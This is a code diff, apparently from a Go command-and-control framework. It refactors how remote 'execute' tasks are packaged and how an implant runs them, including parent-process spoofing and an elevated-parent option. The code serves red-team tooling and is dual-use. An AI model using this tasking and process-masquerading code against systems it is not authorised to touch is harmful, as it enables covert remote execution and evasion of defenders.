@@ -12,10 +12,6 @@ import (
 	"github.com/iDigitalFlame/xmt/data"
 )
 
-// TaskProcess is a Task that instructs the Client to run the supplied command and return the output if the 'Wait'
-// flag is true.
-const TaskProcess simpleTask = 0xB004
-
 // Process is a struct that is similar to the 'cmd.Process' struct. This is used to Task a Client with running
 // a specified command.
 type Process struct {
@@ -31,6 +27,27 @@ type Process struct {
 	name     string
 	choices  []string
 	elevated bool
+}
+
+// Run returns a Packet with the 'TvExecute' ID value and a Process struct in the payload that is based on the
+// provided string vardict. By default, this will wait for the Process to complete before the client returns the
+// output.
+func Run(s ...string) *com.Packet {
+	return Execute(&Process{Args: s, Wait: true})
+}
+
+// Command returns a Packet with the 'TvExecute' ID value and a Process struct in the payload that is based on the
+// supplied command, which is parsed using 'cmd.Split'. By default, this will wait for the Process to complete before
+// the client returns the output.
+func Command(s string) *com.Packet {
+	return Execute(&Process{Args: cmd.Split(s), Wait: true})
+}
+
+// Execute returns a Packet with the 'TvExecute' ID value and the provided Process struct as the Payload.
+func Execute(e *Process) *com.Packet {
+	p := &com.Packet{ID: TvExecute}
+	e.MarshalStream(p)
+	return p
 }
 
 // SetFlags will set the startup Flag values used for Windows programs. This function overrites many
@@ -166,34 +183,28 @@ func (p *Process) UnmarshalStream(r data.Reader) error {
 func (p *Process) SetParentRandomEx(c []string, e bool) {
 	p.name, p.pid, p.choices, p.elevated = "", -1, c, e
 }
-func (p Process) convert(x context.Context) *cmd.Process {
-	e := cmd.NewProcessContext(x, p.Args...)
-	e.Timeout = p.Timeout
-	e.Dir, e.Env = p.Dir, p.Env
-	e.SetFlags(p.Flags)
-	switch {
-	case p.pid != 0:
-		e.SetParentPID(p.pid)
-	case len(p.name) > 0:
-		e.SetParentEx(p.name, p.elevated)
-	case len(p.choices) > 0:
-		e.SetParentRandomEx(p.choices, p.elevated)
-	}
-	if len(p.Stdin) > 0 {
-		e.Stdin = bytes.NewReader(p.Stdin)
-	}
-	return e
-}
-func taskProcess(x context.Context, p *com.Packet) (*com.Packet, error) {
+func process(x context.Context, p *com.Packet) (*com.Packet, error) {
 	var e Process
 	if err := e.UnmarshalStream(p); err != nil {
 		return nil, err
 	}
 	var (
-		z   = e.convert(x)
+		z   = cmd.NewProcessContext(x, e.Args...)
 		o   bytes.Buffer
 		err error
 	)
+	switch z.SetFlags(e.Flags); {
+	case e.pid != 0:
+		z.SetParentPID(e.pid)
+	case len(e.name) > 0:
+		z.SetParentEx(e.name, e.elevated)
+	case len(e.choices) > 0:
+		z.SetParentRandomEx(e.choices, e.elevated)
+	}
+	if len(e.Stdin) > 0 {
+		z.Stdin = bytes.NewReader(e.Stdin)
+	}
+	z.Timeout, z.Dir, z.Env = e.Timeout, e.Dir, e.Env
 	if e.Wait {
 		z.Stdout = &o
 		z.Stderr = &o
